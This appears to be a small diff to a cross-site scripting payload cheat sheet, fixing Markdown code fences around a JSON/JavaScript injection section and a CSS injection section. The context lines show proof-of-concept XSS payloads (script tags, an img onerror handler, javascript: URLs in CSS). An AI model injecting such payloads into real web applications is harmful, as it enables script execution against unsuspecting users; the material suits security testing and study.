@@ -92,8 +92,9 @@ Payload example for DOM sink:
 
 ---
 
-```html
 8. JSON/JavaScript Injection
+
+```html
 
 {"name":"<script>alert(1)</script>"}
 
@@ -108,6 +109,7 @@ var data = "<img src=x onerror=alert(1)>";
 ```html
 <style>@import 'javascript:alert(1)';</style>
 <div style="background:url(javascript:alert(1))">
+```
 
 
 ---
